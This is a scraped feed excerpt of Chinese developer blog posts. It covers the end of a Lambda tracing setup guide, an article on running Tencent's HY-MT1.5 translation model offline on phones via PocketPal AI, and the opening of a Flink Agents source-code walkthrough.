<span class="hljs-symbol">arn:</span>aws-us-<span class="hljs-symbol">gov:</span><span class="hljs-symbol">lambda:</span>&lt;<span class="hljs-variable constant_">AWS_REGION</span>&gt;<span class="hljs-symbol">:</span>002406178527<span class="hljs-symbol">:layer</span><span class="hljs-symbol">:Datadog-&lt;RUNTIME&gt;</span><span class="hljs-symbol">:</span><span class="hljs-number">118</span>

<span class="hljs-comment"># Use this format for arm64-based Lambda deployed in AWS GovCloud regions</span>
<span class="hljs-symbol">arn:</span>aws-us-<span class="hljs-symbol">gov:</span><span class="hljs-symbol">lambda:</span>&lt;<span class="hljs-variable constant_">AWS_REGION</span>&gt;<span class="hljs-symbol">:</span>002406178527<span class="hljs-symbol">:layer</span><span class="hljs-symbol">:Datadog-&lt;RUNTIME&gt;-ARM</span><span class="hljs-symbol">:</span><span class="hljs-number">118</span>
</code></pre>
<p>将 <code>&lt;AWS_REGION&gt;</code> 替换为有效的 AWS 区域，例如 <code>us-east-1</code>。<code>&lt;RUNTIME&gt;</code> 的选项有：<code>Python38、Python39、Python310、Python311、Python312、Python313</code>。</p>
<ul>
<li>AWS 中国区</li>
</ul>
<p>由于 Datadog 并没有在中国区的维护 <code>datadog-lambda-python</code> 层，所以我们使用 <code>pip</code> 将 <code>datadog-lambda</code> 包及其依赖项本地安装到您的函数项目文件夹中。</p>
<pre><code class="hljs language-python" lang="python">pip install datadog-<span class="hljs-keyword">lambda</span> -t ./
</code></pre>
<p>注意 ：<code>datadog-lambda</code> 依赖于 ddtrace，而 ddtrace 使用了原生扩展；因此必须在正确架构（x86_64 或 arm64）的 Linux 环境中安装和编译。</p>
<p>将函数的「运行时-处理程序」设置为 <code>datadog_lambda.handler.handler</code> 。</p>
<h3 data-id="heading-6">环境变量配置</h3>
<ul>
<li>DD_TRACE_ENABLED: 开启分布式追踪默认为 true</li>
<li>DD_LAMBDA_HANDLER: 设置为原始处理程序，例如：<code>lambda_function.lambda_handler</code></li>
<li>DD_TRACE_AGENT_URL：<code>http://localhost:9529</code></li>
<li>DD_TRACE_DEBUG：日志输出，默认关闭</li>
<li>ENV_DATAWAY：上报数据的 DataWay 地址（token 从工作空间获取）</li>
</ul>
<p>配置完成后，点击测试，然后可以登陆平台查看链路数据。</p>
<h2 data-id="heading-7">效果展示</h2>
<p>配置完成后，点击测试，成功后到观测云工作空间后，相关链路以及指标信息。</p>
<h3 data-id="heading-8">APM</h3>
<p><code>service:aws.lambda</code></p>
<p><code>resource:&lt;Your AWS Lambda FuncName&gt;</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1a71e748c48c412cba8c9d56fe32c5f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769165386&amp;x-signature=VMVSrbXBUIedKUGiIaFW9%2BiyK9A%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-9">指标</h3>
<p>指标说明：AWS Lambda 拓展 &gt; 指标</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d7bd447722ef4f9d8af5330721c477c6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769165386&amp;x-signature=pGi4Ofd55dP6%2FItCipIJIua9%2FRw%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-10">日志</h3>
<p><code>source:awslambda</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4e8182390dca481a9e07ee821c208285~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Y-v6KeC5rWL5oCn55So6KeC5rWL5LqR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769165386&amp;x-signature=kFzth6W0bZuwK58dE%2BUVpBEHow4%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[手机上跑离线翻译？腾讯这款1GB的AI模型让我彻底告别翻译付费]]></title>    <link>https://juejin.cn/post/7595769731199008774</link>    <guid>https://juejin.cn/post/7595769731199008774</guid>    <pubDate>2026-01-16T10:53:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595769731199008774" data-draft-id="7595785828132634660" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="手机上跑离线翻译？腾讯这款1GB的AI模型让我彻底告别翻译付费"/> <meta itemprop="keywords" content="LLM,OpenAI,AIGC"/> <meta itemprop="datePublished" content="2026-01-16T10:53:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="win4r"/> <meta itemprop="url" content="https://juejin.cn/user/1739869037541555"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            手机上跑离线翻译？腾讯这款1GB的AI模型让我彻底告别翻译付费
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1739869037541555/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    win4r
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-16T10:53:08.000Z" title="Fri Jan 16 2026 10:53:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>你有没有想过，有一天你的手机可以变成一台专业的翻译机，而且完全不需要联网？</p>
<p>上周我出差去泰国，飞机刚落地那会儿，机场WiFi慢得像蜗牛，国内的翻译App各种转圈圈。当时我就想，要是能有个不依赖网络的翻译工具该多好。结果回来一搜，还真让我发现了宝藏——腾讯混元团队发布的HY-MT1.5翻译模型，配合一款叫pocketpal AI的App，竟然真的能在手机上跑离线翻译！</p>
<p>🔥🔥🔥本篇笔记所对应的视频：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1FfkKBxEjf%2F" target="_blank" title="https://www.bilibili.com/video/BV1FfkKBxEjf/" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1Ff…</a></p>
<p>关键是，这玩意儿量化后只有1.13GB，比一集电视剧还小，却能支持33种语言互译，翻译质量据说能达到Gemini 3 Pro的90%。</p>
<p>今天这篇文章，我就把这套组合的来龙去脉、部署方法、实测效果一次性说清楚。如果你还在为各种翻译API付费，又担心隐私泄露和网络延迟，那这篇文章你一定要看完。</p>
<h2 data-id="heading-0">这到底是个什么模型？</h2>
<p>HY-MT1.5是腾讯混元团队在2025年底开源的翻译专用模型，全称叫Hunyuan Translation Model Version 1.5。这个系列包含两个版本：1.8B参数版和7B参数版。</p>
<p>1.8B参数版是今天的主角。别看它参数量不大，这是一个经过专门优化的翻译模型，基于混元团队在WMT25机器翻译大赛中获得优异成绩的模型升级而来。技术报告显示，虽然它的参数量不到7B版本的三分之一，但翻译性能却能达到大模型的水准，在同等参数规模的模型中处于业界领先水平，甚至超越了大多数商用翻译API。</p>
<p>这个模型支持33种主流语言的互译，涵盖了中文、英文、日语、韩语、法语、德语、西班牙语、俄语、阿拉伯语、泰语、越南语等。更有意思的是，它还支持5种民族语言和方言，包括藏语、哈萨克语、蒙古语、维吾尔语，以及粤语。对，你没看错，粤语翻译也能搞定。</p>
<p>除了基础的翻译功能，这个模型还内置了三项非常实用的高级能力。第一是术语表控制，你可以指定某些专业词汇的翻译方式，比如让它把某个品牌名统一翻译成你想要的样子。第二是上下文连续翻译，模型可以参考上文信息来翻译当前内容，避免出现前后不一致的情况。第三是格式保留，翻译时可以保留原文中的标签和格式信息，这对于处理技术文档特别有用。</p>
<h2 data-id="heading-1">为什么能在手机上跑？</h2>
<p>要在手机这种算力有限的设备上跑大模型，关键在于量化。腾讯混元团队很贴心地发布了GGUF格式的量化版本，这是目前本地部署大模型最流行的格式之一。</p>
<p>GGUF格式的好处是什么？简单来说，它是llama.cpp项目专门设计的模型格式，针对CPU和移动设备做了大量优化。腾讯提供了多种量化精度供选择：4-bit量化版只有1.13GB，6-bit版1.47GB，8-bit版1.91GB。</p>
<p>4-bit的Q4_K_M版本是最适合手机的选择。1GB出头的体积，现在随便一台手机都装得下。而且经过实测，量化后的翻译质量损失非常小，日常使用完全够用。</p>
<h2 data-id="heading-2">pocketpal AI：让手机变成AI翻译机</h2>
<p>光有模型还不够，还需要一个能在手机上加载和运行模型的App。这里要介绍的就是pocketpal AI。</p>
<p>pocketpal AI是一款完全开源的移动端大模型运行工具，同时支持iOS和Android系统。它的底层使用llama.cpp推理引擎，这是目前最成熟的本地大模型推理框架，经过了无数开发者的优化和测试。正因为使用llama.cpp，所以它天然支持GGUF格式的模型，刚好能运行我们今天要部署的混元翻译模型。</p>
<p>这个App的设计理念是隐私优先。所有的模型推理都在本地完成，你的对话内容、翻译文本永远不会上传到任何服务器。唯一可能离开你手机的数据，是你主动选择分享的基准测试结果或反馈信息。</p>
<p>pocketpal AI的功能相当丰富。除了基础的模型加载和对话功能，它还支持自动管理内存，当App退到后台时会自动卸载模型释放内存。你可以自定义推理参数，比如温度、系统提示词等。它还有实时性能监控，能显示每秒生成多少token。另外还有一个很贴心的设计：推理过程中屏幕会保持常亮，不用担心翻译到一半手机息屏了。</p>
<h2 data-id="heading-3">手把手教你部署</h2>
<p>说了这么多理论，现在进入实战环节。整个部署过程其实非常简单，大概五分钟就能搞定。</p>
<p>首先是安装pocketpal AI。如果你用的是iPhone，直接在App Store搜索pocketpal AI就能找到，免费下载。安卓用户则去Google Play搜索下载。安装完成后打开App。</p>
<p>接下来是下载模型。打开App后，点击左上角的菜单图标，然后选择Models进入模型管理页面。这里会列出一些预置的可下载模型，往下滑动找到腾讯混元的翻译模型HY-MT1.5-1.8B，点击绿色的下载按钮就会自动开始下载。</p>
<p>如果列表里没有找到这个模型，或者你想用特定的量化版本，也可以通过另一种方式添加。点击模型页面的加号按钮，选择从Hugging Face添加，搜索tencent HY-MT1.5-1.8B-GGUF，就能看到各种量化版本可供选择。你也可以提前在电脑上下载好模型文件，传到手机上，然后在pocketpal AI里选择添加本地模型。</p>
<p>模型下载完成后，点击模型旁边的Load按钮加载模型到内存。加载成功后，界面上会显示当前加载的模型名称，这时候就可以开始使用了。</p>
<h2 data-id="heading-4">实测效果：真的能打</h2>
<p>模型部署好了，效果到底怎么样？我用几个实际场景测试了一下。</p>
<p>第一个测试是基础中译英。我输入了一段比较典型的中文：人工智能正在深刻改变我们的生活方式，从智能家居到自动驾驶，AI技术无处不在。模型几乎是秒回，翻译结果用词准确，语句通顺，完全不是那种生硬的机翻感觉，读起来很自然。</p>
<p>第二个测试是专业术语翻译。我找了几个医学术语来考验它：Myocardial Infarction、Cerebrovascular Accident、Hypertension、Diabetes Mellitus。结果全部翻译正确：心肌梗死、脑血管意外、高血压、糖尿病。对于需要翻译专业文献的用户来说，这个能力相当重要。</p>
<p>第三个测试是方言翻译，这也是这个模型的特色功能之一。我准备了一句粤语，让它翻译成普通话。输入你今日食咗饭未，我哋一齐去饮茶啦，模型立刻给出了准确的翻译：你今天吃饭了吗，我们一起去喝茶吧。对于需要处理粤语内容的用户来说，这个功能非常实用。</p>
<p>第四个测试是对比测试。我找了一句容易翻错的英文：I saw her duck。字面意思是我看到了她的鸭子，但实际上这句话有个双关，duck在这里是动词，意思是躲避。混元翻译模型给出的翻译是我看见她躲起来了，完全正确。而iPhone自带的翻译功能则翻译成我看到了她的鸭子，只理解了字面意思。这个对比很直观地说明了专业翻译模型和普通翻译工具的差距。</p>
<p>在推理速度方面，我在一台老款iPhone 13上测试，推理速度能达到每秒7-12个token左右。考虑到这是四五年前的手机，这个速度已经相当不错了。如果你用的是新款手机，速度还会更快。</p>
<h2 data-id="heading-5">谁适合用这个方案？</h2>
<p>基于以上测试，我总结了几类特别适合使用这套方案的人群。</p>
<p>首先是经常出国旅行的人。飞机上没网、国外流量贵、机场WiFi不稳定，这些问题用离线翻译一次性解决。1GB多的模型提前下好，走到哪翻到哪。</p>
<p>其次是对隐私有要求的用户。商务文件、法律合同、私人通信，这些敏感内容你可能不太想上传到第三方服务器。本地运行意味着数据永远不出你的手机。</p>
<p>第三是需要处理专业术语的用户。医学、法律、技术文档，这些领域的翻译对准确性要求很高。混元模型在专业术语上的表现明显优于普通翻译工具。</p>
<p>第四是需要方言翻译的用户。粤语翻译这个功能在市面上的翻译工具里相当少见，如果你有这方面的需求，这个模型几乎是唯一选择。</p>
<p>第五是想省钱的用户。各种翻译API按量计费，用多了费用也不低。本地部署一次搞定，后续使用完全免费。</p>
<h2 data-id="heading-6">写在最后</h2>
<p>在AI翻译领域，我们长期以来只有两个选择：要么用免费但质量一般的工具，要么付费使用专业API。腾讯混元这次开源的HY-MT1.5模型，加上pocketpal AI这样的本地运行工具，给了我们第三个选择：免费、高质量、完全离线、保护隐私。</p>
<p>当然，这套方案也不是完美的。比如它不支持语音翻译，不能拍照翻译，这些功能还是需要其他工具配合。但作为一个文本翻译方案，它的表现已经相当出色。</p>
<p>如果你对这套方案感兴趣，不妨花十分钟试试看。模型在Hugging Face上可以免费下载，pocketpal AI在应用商店免费安装。部署过程不需要任何技术背景，跟着操作就能完成。</p>
<p>有什么问题或者使用心得，欢迎在评论区交流。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【大数据 & AI】Flink Agents 源码解读 --- (7) --- AgentsExecutionEnvironment]]></title>    <link>https://juejin.cn/post/7595422019778117682</link>    <guid>https://juejin.cn/post/7595422019778117682</guid>    <pubDate>2026-01-15T14:04:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595422019778117682" data-draft-id="7595422019778101298" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【大数据 &amp; AI】Flink Agents 源码解读 --- (7) --- AgentsExecutionEnvironment"/> <meta itemprop="keywords" content="算法,人工智能"/> <meta itemprop="datePublished" content="2026-01-15T14:04:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="罗西的思考"/> <meta itemprop="url" content="https://juejin.cn/user/351470467691175"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【大数据 &amp; AI】Flink Agents 源码解读 --- (7) --- AgentsExecutionEnvironment
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/351470467691175/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    罗西的思考
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T14:04:18.000Z" title="Thu Jan 15 2026 14:04:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读21分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">【大数据 &amp; AI】Flink Agents 源码解读 --- (7) --- AgentsExecutionEnvironment</h2>
<ul>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x00 概要</a></p>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x01 基础知识</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.1 定义</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.2 功能</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">1.3 与原生 Flink Environment 的区别</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x02 LocalExecutionEnvironment</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.1 定义</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.2 LocalRunner</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">2.3 LocalRunnerContext</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0x03 RemoteExecutionEnvironment</a></p>
<ul>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.1 核心特色</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.2 与原生 Flink RemoteEnvironment 的对比</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.3 如何使用 ActionExecutionOperator</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.4 典型流程</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.5 交互逻辑</a></li>
<li><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">3.6 实现</a></li>
</ul>
</li>
<li>
<p><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer">0xFF 参考</a></p>
</li>
</ul>
<h3 data-id="heading-1">0x00 概要</h3>
<p>AgentsExecutionEnvironment 是在Flink基础上构建的一个更高层次的执行环境，专门为Agent而设计，同时保留了与原生 Flink API 的兼容性。</p>
<h3 data-id="heading-2">0x01 基础知识</h3>
<p>可以把 Flink 原生的 <code>StreamExecutionEnvironment</code> / <code>TableEnvironment</code> 理解成“Agent 话题里所说的<strong>执行环境</strong>（Execution Environment）”，但是其无法直接被 Agent 使用。因此需要在其上做一些封装和适配，这就是 AgentsExecutionEnvironment。</p>
<ol>
<li>
<p>Flink Environment = 纯粹的<strong>计算资源与运行时容器</strong></p>
<ul>
<li>负责申请 Slot、管理 Checkpoint、调度算子链、网络 Shuffle</li>
